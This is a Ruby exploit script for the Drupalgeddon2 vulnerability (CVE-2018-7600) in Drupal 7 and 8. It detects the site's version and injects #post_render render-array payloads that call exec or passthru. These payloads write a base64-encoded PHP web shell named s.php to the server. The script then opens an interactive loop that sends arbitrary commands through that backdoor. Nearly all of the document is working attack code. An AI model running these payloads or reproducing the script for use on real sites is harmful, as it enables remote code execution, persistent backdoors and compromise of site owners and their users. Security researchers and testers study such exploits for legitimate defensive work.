#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' ~ https://github.com/dreadlocked/Drupalgeddon2/
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#


require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'


# Proxy information (nil to disable)
proxy_addr = nil
proxy_port = 8080


# Quick how to use
if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target>"
  puts "       ruby drupalgeddon2.rb https://example.com"
  exit
end
# Read in values
target = ARGV[0]


# Banner
puts "[*] --==[::#Drupalggedon2::]==--"
puts "-"*80


# Check input for protocol
if not target.start_with?('http')
  target = "http://${target}"
end
# Check input for the end
if not target.end_with?('/')
  target += "/"
end


# Payload (we could just be happy with this, but we can do better!)
#evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"


# Feedback
puts "[*] Target : #{target}"
puts "[*] Payload: #{evil}"
puts "-"*80


# Try and get version
drupalverion = nil
# Possible URLs
url = [
  target + "CHANGELOG.txt",
  target + "core/CHANGELOG.txt",
  target + "includes/bootstrap.inc",
  target + "core/includes/bootstrap.inc",
]
# Check all
url.each do|uri|
  exploit_uri = URI(uri)

  # Check response
  http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
  request = Net::HTTP::Get.new(exploit_uri.request_uri)
  response = http.request(request)

  if response.code == "200"
    puts "[+] Found  : #{uri} (#{response.code})"
    # Patched already?
    puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"

    drupalverion = response.body.match(/Drupal (.*),/).to_s().slice(/Drupal (.*),/, 1).strip
    puts "[+] Drupal!: #{drupalverion}"
    # Done!
    break
  elsif response.code == "403"
    puts "[+] Found  : #{uri} (#{response.code})"

    drupalverion = uri.match(/core/)? '8.x' : '7.x'
    puts "[+] Drupal?: #{drupalverion}"
  else
    puts "[!] MISSING: #{uri} (#{response.code})"
  end
end

if not drupalverion
  puts "[!] Didn't detect Drupal version"
  puts "[!] Forcing Drupal v8.x attack"
  drupalverion = "8.x"
end
puts "-"*80


# PHP function to use (don't forget about disabled functions...)
phpmethod = drupalverion.start_with?('8')? 'exec' : 'passthru'
puts "[*] PHP cmd: #{phpmethod}"
puts "-"*80


## Check the version to match the payload
if drupalverion.start_with?('8')
  # Method #1 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
  #url = target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
  #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil

  # Method #2 - Drupal 8, mail, #post_render - response is 200
  url = target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
  # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
elsif drupalverion.start_with?('7')
  # Method #3 - Drupal 7, name, #post_render - response is 200
  url = target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
  payload = "form_id=user_pass&_triggering_element_name=name"
else
  puts "[!] Unsupported Drupal version"
  exit
end


uri = URI(url)
http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port)


# Use SSL/TLS if needed
if uri.scheme == 'https'
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end


# Drupal v7 needs an extra value from a form
if drupalverion.start_with?('7')
  req = Net::HTTP::Post.new(uri.request_uri)
  req.body = payload
  response = http.request(req)

  form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).strip
  url = target + "file/ajax/name/%23value/" + form_build_id
  uri = URI(url)
  payload = "form_build_id=" + form_build_id
end


# Make the request
req = Net::HTTP::Post.new(uri.request_uri)
req.body = payload


# Check response
response = http.request(req)
if response.code == "200"
  puts "[+] Target seems to be exploitable! w00hooOO!"
  #puts "[+] Result: " + JSON.pretty_generate(JSON[response.body])
  result = drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
  puts "[+] Result: #{result}"
else
  puts "[!] Target does NOT seem to be exploitable ~ Response: #{response.code}"
end
puts "-"*80


# Feedback
puts "[*]   curl '#{target}s.php' -d 'c=whoami'"
puts "-"*80


# Test to see if backdoor is there
exploit_uri = URI(target + "s.php")
# Check response
http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
request = Net::HTTP::Get.new(exploit_uri.request_uri)
response = http.request(request)

if response.code == "200"
  puts "[*] Fake shell: "

  # Stop any CTRL + C action ;)
  trap('INT', 'SIG_IGN')

  # Forever loop
  loop do
    # Get input
    command = Readline.readline('drupalgeddon2> ', true)

    # Exit
    break if command =~ /exit/

    # Blank link?
    next if command.empty?

    # Send request
    req = Net::HTTP::Post.new(exploit_uri.request_uri)
    req.body = "c=#{command}"
    puts http.request(req).body
  end
else
  puts "[!] Exploit FAILED ~ Response: #{response.code}"
  exit
end
